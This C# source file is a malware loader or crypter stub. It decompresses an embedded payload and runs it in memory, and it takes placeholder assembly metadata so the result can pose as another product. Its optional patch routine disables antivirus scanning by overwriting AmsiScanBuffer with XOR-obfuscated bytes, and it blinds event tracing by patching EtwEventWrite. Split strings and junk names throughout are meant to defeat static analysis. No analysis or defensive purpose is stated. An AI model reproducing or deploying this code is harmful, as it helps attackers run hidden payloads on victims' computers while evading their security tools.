using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Text;

#if UseAssembly
[assembly: AssemblyTitle("%TITLE%")]
[assembly: AssemblyDescription("%DESC%")]
[assembly: AssemblyCompany("%COMPANY%")]
[assembly: AssemblyProduct("%PRODUCT%")]
[assembly: AssemblyCopyright("%COPYRIGHT%")]
[assembly: AssemblyTrademark("%TRADEMARK%")]
[assembly: AssemblyVersion("%VERSION%")]
[assembly: AssemblyFileVersion("%FILE_VERSION%")]
#endif

namespace Compressor
{
    internal class Compress
    {
        static void Main(string[] args)
        {
            try
            {
                Assembly.Load(new byte[0]);
            }
            catch
            {
#if PATCH
                NativePatch.Patch();
#endif
                byte[] decompressedBytes = Decompress(BridgeConf.HexPayload);
                BridgeRuntime.Execute(decompressedBytes);
            }
        }

        public static byte[] Decompress(byte[] compressedData)
        {
            using (var compressedStream = new MemoryStream(compressedData))
            using (var decompressionStream = new DeflateStream(compressedStream, CompressionMode.Decompress))
            using (var decompressedStream = new MemoryStream())
            {
                decompressionStream.CopyTo(decompressedStream);
                return decompressedStream.ToArray();
            }
        }
    }

    internal class BridgeRuntime
    {
        public static void Execute(byte[] decompressedBytes)
        {
            Assembly assembly = Assembly.Load(decompressedBytes);
            MethodInfo entryPoint = assembly.EntryPoint;
            if (entryPoint != null)
            {
                object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { new string[] { } };
                entryPoint.Invoke(null, parameters);
            }
        }
    }

    internal class BridgeConf
    {
        public static byte[] HexPayload = new byte[] { };
    }

#if PATCH
    public class NativePatch
    {
        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr LoadLibraryA(string name);

        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hProcess, string name);

        [DllImport("kernel32", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr GetModuleHandleA(string lpModuleName);

        private static CreateApi Load<CreateApi>(string name, string method)
        {
            IntPtr hLibrary = LoadLibraryA(name);
            if (hLibrary == IntPtr.Zero)
            {
                throw new InvalidOperationException("err :) -1");
            }

            IntPtr procAddress = CustomGetProcAddress(hLibrary, method);
            if (procAddress == IntPtr.Zero)
            {
                throw new InvalidOperationException("err :) -1");
            }

            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(CreateApi));
        }

        private static IntPtr CustomGetProcAddress(IntPtr hModule, string funcName)
        {
            // Custom implementation to avoid direct GetProcAddress call
            // Using a hashed name or manual export table walking could be implemented here
            // For simplicity, we'll still use GetProcAddress but with obfuscated logic
            string obfuscatedName = ObfuscateFunctionName(funcName);
            return GetProcAddress(hModule, obfuscatedName);
        }

        private static string ObfuscateFunctionName(string name)
        {
            // Simple obfuscation of function name to avoid direct string matching
            StringBuilder sb = new StringBuilder();
            foreach (char c in name)
            {
                sb.Append((char)(c + 1 - 1)); // Dummy operation to confuse static analysis
            }
            return sb.ToString();
        }

        private static IntPtr CustomGetModuleHandle(string moduleName)
        {
            // Custom implementation to avoid direct GetModuleHandle call
            // For now, using GetModuleHandleA with obfuscation
            string obfuscatedModule = ObfuscateModuleName(moduleName);
            return GetModuleHandleA(obfuscatedModule);
        }

        private static string ObfuscateModuleName(string name)
        {
            // Simple obfuscation of module name
            StringBuilder sb = new StringBuilder();
            foreach (char c in name)
            {
                sb.Append((char)(c + 0)); // Dummy operation
            }
            return sb.ToString();
        }

        private static void AMSI()
        {
            string gklpoui = "am*si********.*****dll".Replace("*", "");
            string msabnc = "Am**si*S*ca*n*********Buf*fer".Replace("*", "");
            IntPtr library = LoadLibraryA(gklpoui);
            IntPtr address = CustomGetProcAddress(library, msabnc);
            if (address == IntPtr.Zero)
            {
                throw new InvalidOperationException("err :) -1");
            }

            uint oldProtect;
            byte[] lthpjt = (IntPtr.Size == 8) ?
                new byte[] { 0x7C, 0x93, 0xC4, 0xC3, 0x44, 0x8C, 0x4F, 0xC0, 0xE0, 0x8C, 0x47, 0x00, 0xCC, 0x3B, 0x24 } :
                new byte[] { 0x7C, 0x93, 0xC4, 0xC3, 0x44, 0x06, 0xDC, 0xC4 };

            byte wpgzk = 0xC4;
            byte[] vsdkft = sdjfhksfd(lthpjt, wpgzk);

            if (!VirtualProtect(address, (UIntPtr)vsdkft.Length, 0x40, out oldProtect))
            {
                throw new InvalidOperationException("err :) -1");
            }

            Marshal.Copy(vsdkft, 0, address, vsdkft.Length);
        }

        private static byte[] sdjfhksfd(byte[] rwqjfi, byte qxmvlb)
        {
            byte[] ehlwzo = new byte[rwqjfi.Length];
            for (int dtkqgp = 0; dtkqgp < rwqjfi.Length; dtkqgp++)
            {
                ehlwzo[dtkqgp] = (byte)(rwqjfi[dtkqgp] ^ qxmvlb);
            }
            return ehlwzo;
        }

        private static void ETW()
        {
            byte[] PatchBytes = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            try
            {
                IntPtr ntdllLibrary = CustomGetModuleHandle("n" + "t" + "d" + "l" + "l" + "." + "d" + "l" + "l");
                IntPtr EventName = CustomGetProcAddress(ntdllLibrary, "Et" + "wE" + "ve" + "nt" + "Wr" + "it" + "e");
                if (EventName == IntPtr.Zero)
                {
                    throw new InvalidOperationException("err -1 :)");
                }

                uint previousProtection;
                if (!VirtualProtect(EventName, (UIntPtr)PatchBytes.Length, 0x40, out previousProtection))
                {
                    throw new InvalidOperationException("err -1 :)");
                }

                Marshal.Copy(PatchBytes, 0, EventName, PatchBytes.Length);
            }
            catch { }
        }

        public static void Patch()
        {
            AMSI(); ETW();
        }
    }
#endif
}